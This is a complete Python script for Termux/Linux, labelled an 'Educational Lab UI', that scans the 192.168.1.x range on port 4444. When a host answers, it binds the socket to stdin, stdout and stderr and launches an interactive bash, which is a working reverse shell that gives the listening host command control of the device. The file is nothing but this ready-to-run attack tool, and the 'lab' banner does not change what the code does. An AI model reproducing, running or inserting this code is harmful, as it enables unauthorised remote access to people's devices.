#!/data/data/com.termux/files/usr/bin/python3

import socket
import os
import subprocess
import sys
import time

# ================= SETTINGS =================
PORT = 4444
BASE = "192.168.1."
START = 1
END   = 254
TIMEOUT = 1.5
DELAY = 0.1
# =============================================

def banner():
    print(r"""
\033[1;32m
██████╗ ██╗ ██╗███████╗██╗ ██╗██████╗ ██████╗ ██╗ ██╗
██╔══██╗██║ ██║██╔════╝██║ ██║██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝██║ ██║███████╗██║ ██║██████╔╝██║ ██║ ╚███╔╝ 
██╔══██╗██║ ██║╚════██║██║ ██║██╔══██╗██║ ██║ ██╔██╗ 
██████╔╝╚██████╔╝███████║╚██████╔╝██████╔╝╚██████╔╝██╔╝ ██╗
╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝
\033[0m
        BusyBox Terminal – Educational Lab UI
-----------------------------------------------------------
  Author   : SHIVAM_PRO
  Version  : v1.1 (Stable)
  Platform : Android (Termux) / Linux
-----------------------------------------------------------
  [INFO] Lab Ready ✅
===========================================================
""")

def try_connect(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)

    try:
        result = s.connect_ex((ip, PORT))

        if result == 0:
            print(f"\n\033[1;32m[+] OPEN PORT FOUND → {ip}:{PORT}\033[0m")
            print(f"\033[1;33m[+] Dropping into shell...\033[0m")

            # Redirect stdin, stdout, stderr
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            subprocess.call(["/data/data/com.termux/files/usr/bin/bash", "-i"])
            return True

        return False

    except Exception:
        return False

    finally:
        s.close()


def main():
    banner()

    print(f"\033[1;36m[*] Scanning {BASE}{START}-{END} on port {PORT}...\033[0m")
    print(f"\033[1;35m[Total hosts: {END-START+1}]\033[0m\n")

    for i in range(START, END + 1):
        ip = BASE + str(i)

        sys.stdout.write(f"\r\033[K\033[1;33m[Scanning] {ip:15}\033[0m")
        sys.stdout.flush()

        if try_connect(ip):
            print(f"\n\033[1;32m[✓] Connection established!\033[0m")
            return

        time.sleep(DELAY)

    print(f"\n\033[1;31m[-] No host found with port {PORT} open\033[0m")


if __name__ == "__main__":
    main()
